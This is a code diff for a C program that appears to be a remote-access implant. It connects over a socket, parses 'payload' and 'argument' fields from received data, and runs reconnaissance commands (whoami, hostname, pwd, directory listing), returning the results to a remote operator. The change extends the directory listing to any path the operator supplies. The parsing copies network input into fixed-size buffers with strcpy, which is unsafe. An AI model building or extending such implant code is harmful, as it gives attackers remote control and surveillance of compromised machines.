@@ -13,7 +13,7 @@
 void networking();
 
 //executing command
-char *executing(char *receive);
+char *executing(char *receive, char *arg);
 
 //whoami command
 char *whoamiCommand();
@@ -25,7 +25,7 @@ char *hostnameCommand();
 char *pwdCommand();
 
 //ls command
-char *lsCommand();
+char *lsCommand(char *arg);
 
 int main() {
     networking();
@@ -56,15 +56,37 @@ void networking() {
     	int inferno_receive = recv(inferno_socket, receive, 1024, 0);
     	printf("Receiving:\n\n%s\n\n", receive);
         
+        //copying original payload
+        char receive_copy[1024];
+        strcpy(receive_copy, receive);
+  
         //parsing to extract payload
-        char *content_length = strstr(receive, "{'payload':");
+        char *content_length = strstr(receive_copy, "{'payload':");
         content_length += strlen("{'payload':");
         char *command_start = strtok(content_length, "'");
         char *command = strtok(command_start, "'");
 
+        //copying original payload
+        char receive_copy2[1024];
+        strcpy(receive_copy2, receive);
+
+        //parsing to extract argument
+        char *content_length_arg = strstr(receive_copy2, ",'argument':");
+        char *arg;
+        if (content_length_arg != NULL) {
+            content_length_arg += strlen(",'argument':");
+            char *arg_start = strtok(content_length_arg, "'");
+            arg = strtok(arg_start, "'");
+        }
+
         //executing payload
         char response[1024];
-        char *task = executing(command);
+        char *task;
+        if (content_length_arg == NULL)
+            task = executing(command, NULL);
+        else
+            task = executing(command, arg);    
+
         sprintf(response, "%s\r\n", task);
         printf("Executing: '%s'\n", command);
 
@@ -75,7 +97,7 @@ void networking() {
     }
 }
 
-char *executing(char *receive) {
+char *executing(char *receive, char *arg) {
     char *task;
 
     //execute whoami
@@ -92,7 +114,7 @@ char *executing(char *receive) {
     
     // execute ls
     } else if (strcmp(receive, "ls") == 0) {
-        task = lsCommand();
+        task = lsCommand(arg);
 
     //payload not yet build
     }else {
@@ -121,11 +143,14 @@ char *pwdCommand() {
 }
 
 //ls syscall
-char *lsCommand() {
-    char *buf;
-    DIR *dirp;
+char *lsCommand(char *arg) {
+    if (arg == NULL)
+        arg = ".";
+    char *buf = malloc(1024 * sizeof(char));
+    DIR *dirp = opendir(arg);
+    if (dirp == NULL) 
+        dirp = opendir(".");
     struct dirent *list;
-    dirp = opendir(".");
     sprintf(buf, "Size\tName\n");
     sprintf(buf + strlen(buf), "====\t====\n");
     while ((list = readdir(dirp)) != NULL) {
